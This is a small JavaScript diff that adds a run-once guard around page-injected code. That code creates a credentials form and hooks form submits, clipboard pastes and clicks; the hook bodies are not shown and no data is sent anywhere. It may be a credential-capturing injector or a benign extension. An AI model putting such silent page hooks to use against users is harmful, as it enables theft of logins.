@@ -122,11 +122,14 @@ function clickHook(e) {
     }  
 }
 
-var credsFormElem
-document.addEventListener("DOMContentLoaded", function(event){
-    credsFormElem = createCredsForm();
-    document.addEventListener("submit", submitHook, true);
-    document.addEventListener("paste", clipboardPasteHook, true);
-    document.addEventListener("click", clickHook)
-});
 
+if (!("_injected" in window)) {
+    window._injected = true;
+    var credsFormElem
+    document.addEventListener("DOMContentLoaded", function(event){
+        credsFormElem = createCredsForm();
+        document.addEventListener("submit", submitHook, true);
+        document.addEventListener("paste", clipboardPasteHook, true);
+        document.addEventListener("click", clickHook)
+    });
+}
